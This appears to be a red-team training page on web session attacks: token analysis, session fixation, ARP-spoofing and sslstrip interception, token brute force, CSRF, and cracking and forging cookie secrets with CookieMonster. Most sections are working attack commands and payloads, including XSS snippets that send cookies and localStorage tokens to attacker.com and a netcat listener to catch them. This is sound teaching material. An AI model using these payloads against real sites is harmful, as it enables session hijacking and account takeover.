---
layout: training-page
title: "Session Management Attacks — Red Team Academy"
module: "Web Hacking"
tags:
  - session-hijacking
  - session-fixation
  - cookie-theft
  - token-prediction
  - csrf
page_key: "web-session-attacks"
render_with_liquid: false
---

# Session Management Attacks

Session tokens are the keys to authenticated access. Once an attacker obtains a valid session ID, they become the user in the application's eyes. Attacks include token theft via XSS, network interception, token prediction/brute force, session fixation, and CSRF. Understanding cookie attributes is essential to identifying which attacks are viable.

## Session Token Analysis

Analyze session tokens before attempting any attack. Look for entropy, predictability, and encoding.

```
# Capture session cookies from Burp Suite proxy
# Decode and analyze:
echo "PHPSESSID=abc123def456" | cut -d= -f2 | base64 -d 2>/dev/null

# Check session ID name — reveals technology stack:
# PHPSESSID = PHP
# JSESSIONID = Java/J2EE
# ASP.NET_SessionId = ASP.NET
# CFID + CFTOKEN = ColdFusion
# connect.sid = Node.js/Express

# Analyze entropy — collect multiple tokens and compare:
# Request login 10 times with burp intruder, extract cookies
# Look for sequential patterns, timestamp embedding, short length

# Decode common token formats:
# Base64: echo "TOKEN" | base64 -d
# JWT: echo "TOKEN" | cut -d. -f1 | base64 -d  (header)
#       echo "TOKEN" | cut -d. -f2 | base64 -d  (payload)
# Hex: echo "TOKEN" | xxd

# Test token reuse — use a logged-out session token:
curl -b "session=OLD_TOKEN" https://target.com/dashboard
# If it works — no server-side session invalidation on logout

# Test token length:
# Less than 16 hex chars (64 bits) = brute force feasible
```

## Session Fixation

The attacker sets the victim's session ID before authentication. After the victim logs in, the attacker uses the pre-set ID to access the authenticated session.

```
# Step 1: Get an unauthenticated session ID from the server:
curl -c /tmp/attacker.jar https://target.com/login
cat /tmp/attacker.jar  # note the session token value

# Step 2: Deliver the fixed session to the victim:
# Option A: URL parameter (if app accepts session via URL):
https://target.com/login?PHPSESSID=ATTACKER_KNOWN_TOKEN

# Option B: If app mirrors Set-Cookie for user-supplied values (rare):
# Link that sets the attacker's token in victim's browser

# Option C: XSS to set cookie:
document.cookie = "PHPSESSID=ATTACKER_KNOWN_TOKEN;path=/;domain=.target.com"

# Step 3: Victim logs in using the fixed session
# Step 4: Attacker uses same token — now authenticated:
curl -b "PHPSESSID=ATTACKER_KNOWN_TOKEN" https://target.com/dashboard

# Detection: Does the server issue a NEW session token after login?
# Collect token before login, complete login, compare token
# Same token = fixation vulnerable
# New token = properly regenerated (safe)
```

## Session Hijacking via Network Interception

```
# Prerequisite: traffic not encrypted (HTTP) or SSL stripped
# MITM on same network segment:
arpspoof -i eth0 -t VICTIM_IP GATEWAY_IP &
arpspoof -i eth0 -t GATEWAY_IP VICTIM_IP &
tcpdump -i eth0 -A 'port 80' | grep -i "cookie:"

# Wireshark capture — filter for session cookies:
# http.cookie contains "session"
# Follow TCP stream to see full request/response

# bettercap — MITM + session capture:
bettercap
net.probe on
set arp.spoof.targets VICTIM_IP
arp.spoof on
net.sniff on

# sslstrip — downgrade HTTPS to HTTP:
# Requires: no HSTS, no HSTS preload, first connection via HTTP
sslstrip -l 8080
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080

# Firesheep-style — capture cookies on open WiFi:
# Any HTTP session cookie on unencrypted WiFi is visible to all
```

## Cookie Security Attribute Analysis

Missing cookie attributes directly enable specific attacks. Map the missing attributes to the viable attack vector.

```
# Check all cookie attributes in Burp or curl:
curl -sv https://target.com/login -X POST -d "user=a&pass=b" 2>&1 | grep -i "set-cookie"

# Missing Secure flag:
# Session cookie sent over HTTP (not just HTTPS)
# Attack: HTTP interception, SSL stripping
# Set-Cookie: session=TOKEN   ← no Secure = sent over HTTP

# Missing HttpOnly flag:
# JavaScript can read document.cookie
# Attack: XSS steals session cookie
# Set-Cookie: session=TOKEN   ← no HttpOnly = XSS accessible

# Missing SameSite attribute (or SameSite=None):
# Cookie sent on cross-site requests
# Attack: CSRF attacks — malicious site triggers state-changing requests

# SameSite=Lax (default in modern browsers):
# Protects against CSRF in most cases but not GET-based CSRF

# Overly broad Domain attribute:
# Set-Cookie: session=TOKEN; Domain=.example.com
# Cookie sent to all subdomains including compromised sub.example.com

# Persistent cookies (Expires/Max-Age set):
# Cookie survives browser close — lives on disk
# Attack: physical access to victim machine or browser history theft

# Test: extract cookies from browser storage
# Chrome: Application tab → Cookies
# Firefox: Storage → Cookies
```

## Session Brute Force

```
# Applicable when session IDs have insufficient entropy (<64 bits)
# Or when sequential/predictable patterns exist

# Example of predictable token: base64(username + timestamp)
echo "dXNlcjoxNzA2MTIzNDU2" | base64 -d
# Output: user:1706123456 — trivially predictable

# Sequential token: session_1001, session_1002...
# Generate candidate tokens:
seq 1000 2000 | sed 's/^/session_/' > session_candidates.txt

# Brute force with ffuf:
ffuf -u https://target.com/dashboard \
  -H "Cookie: session=FUZZ" \
  -w session_candidates.txt \
  -mc 200   # look for authenticated responses (200 vs 302 to login)

# For short random tokens (e.g., 4-byte hex = 32-bit = ~4 billion):
# GPU-accelerated enumeration feasible offline
# Python generator for 4-byte hex space:
python3 -c "import itertools; [print(''.join(c)) for c in itertools.product('0123456789abcdef', repeat=8)]" | head -1000 > tokens.txt
```

## CSRF — Cross-Site Request Forgery

```
# CSRF exploits missing SameSite attribute + no CSRF token
# Attacker's page makes authenticated requests on behalf of victim

# Test for CSRF vulnerability:
# 1. Identify state-changing request (e.g., change email)
# 2. Check if CSRF token exists in request
# 3. If no token, or token not validated:

# Basic CSRF PoC (auto-submitting form):
# <form action="https://target.com/change-email" method="POST">
# <input type="hidden" name="email" value="attacker@evil.com">
# </form>
# <script>document.forms[0].submit();</script>

# CSRF via GET (even easier):
# <img src="https://target.com/delete-account?confirm=1">

# JSON CSRF (Content-Type: text/plain trick):
# If server accepts any content type:
# <form action="https://target.com/api/update" method="POST"
#   enctype="text/plain">
# <input name='{"email":"attacker@evil.com","ignore":"' value='"}'>
# </form>

# CSRF token bypass techniques:
# 1. Delete the token parameter entirely
# 2. Submit with an empty token value
# 3. Reuse another user's CSRF token (same token for all users)
# 4. Predict CSRF token if generated from timestamp or user ID
# 5. HTTP verb tampering: change POST to GET (some frameworks don't check GET for CSRF)
```

## XSS Session Theft

```
# Prerequisite: XSS vulnerability + missing HttpOnly on session cookie

# Basic cookie steal payload:
# <script>document.location='https://attacker.com/?c='+document.cookie</script>

# XSS Hunter blind XSS (fires wherever admin views it):
# <script src="https://yourxsshunter.trufflesecurity.com/filename.js"></script>

# Exfiltrate via image (no redirect, more stealthy):
# <script>new Image().src='https://attacker.com/?'+document.cookie</script>

# Catch stolen cookies:
# Attacker server logs:
nc -lvnp 80
# Or: python3 -m http.server 80  (check logs for ?c=... requests)

# Use stolen cookie in curl:
curl -b "session=STOLEN_TOKEN" https://target.com/dashboard

# Session riding — use session in browser:
# Chrome DevTools → Application → Cookies → modify value
# Or Cookie Editor extension
```

## Session Token Storage Attacks

```
# Tokens stored in localStorage (no HttpOnly equivalent) — XSS can access
# Tokens stored in sessionStorage — XSS in same tab can access
# Tokens stored in cookies with HttpOnly — XSS cannot steal, but can ride

# localStorage theft via XSS:
# <script>
# var token = localStorage.getItem('auth_token') || localStorage.getItem('jwt');
# fetch('https://attacker.com/steal?t='+token);
# </script>

# IndexedDB theft:
# <script>
# var req = indexedDB.open('auth_db');
# req.onsuccess = e => { /* dump all keys */ }
# </script>

# Service Worker hijack (persistent XSS via SW):
# Register malicious SW that intercepts all requests including auth headers
# navigator.serviceWorker.register('/sw.js')

# Check where token is stored by examining JS source:
# grep -r "localStorage\|sessionStorage\|cookie" *.js
# Look for: localStorage.setItem('token', response.token)
```

## CookieMonster — Session Cookie Secret Cracking

CookieMonster is a Go CLI tool that decodes and cracks vulnerable session cookies from Django, Flask, Laravel, Rack, Express, and raw JWTs. It brute-forces the HMAC secret key using a wordlist. Once the key is recovered, you can forge arbitrary session cookies with any user ID or role.

```
# Install:
go install github.com/iangcarroll/cookiemonster/cmd/cookiemonster@latest

# Basic usage — crack a cookie using the built-in wordlist (~39k keys):
cookiemonster -cookie "gAJ9cQFYCgAAAHRlc3Rjb29raWVxAlgGAAAAd29ya2VkcQNzLg:1mgnkC:z5yDxzI06qYVAU3bkLaWYpADT4I"
# Output: ✅ Success! key is "changeme" (django decoder)

# Crack cookie fetched directly from a URL (follows redirects, grabs Set-Cookie):
cookiemonster -url "https://target.com/login"

# Use a custom wordlist (entries must be base64-encoded):
# Convert standard wordlist to CookieMonster format:
while IFS= read -r line; do echo -n "$line" | base64; done < /usr/share/wordlists/rockyou.txt > rockyou_b64.txt
cookiemonster -cookie "SESSION_COOKIE" -wordlist rockyou_b64.txt

# Express (cookie-session) — pass cookie + signature separated by ^:
# Headers: session=eyJhbmltYWxzIjoibGlvbiJ9  +  session.sig=Vf2INo...
cookiemonster -cookie "session=eyJhbmltYWxzIjoibGlvbiJ9^Vf2INocdJIqKWVfYGhXwPhQZNFI"

# Resign a forged cookie once the key is known:
cookiemonster -cookie "ORIGINAL_COOKIE" -resign '{"user_id": 1, "is_admin": true}'
# Output: new valid cookie signed with the cracked key

# Supported frameworks:
# Django     — value:timestamp:signature (base64)
# Flask      — itsdangerous: value.timestamp.signature
# Laravel    — AES-CBC encrypted base64 JSON
# Rack       — BAh... (Marshal-encoded Ruby)
# Express    — eyJ... JSON + .sig cookie
# JWT        — HS256/384/512 HMAC tokens
```

## Tools

- CookieMonster — `github.com/iangcarroll/cookiemonster` — session cookie secret cracker
- flask-unsign — `github.com/Paradoxis/Flask-Unsign` — Flask session cookie tool
- Burp Suite — session analysis, CSRF testing, repeater
- XSS Hunter — `xsshunter.trufflesecurity.com` — blind XSS for cookie theft
- bettercap — `bettercap.org` — MITM and session sniffing
- sslstrip — SSL stripping for HTTPS downgrade
- JWT.io — `jwt.io` — decode and analyze JWT tokens

## Resources

- OWASP Session Management Cheat Sheet — `cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html`
- OWASP CSRF Prevention — `cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html`
- PortSwigger Session management labs — `portswigger.net/web-security/authentication`
- OWASP Testing Guide — Session Management Testing — `owasp.org/www-project-web-security-testing-guide`
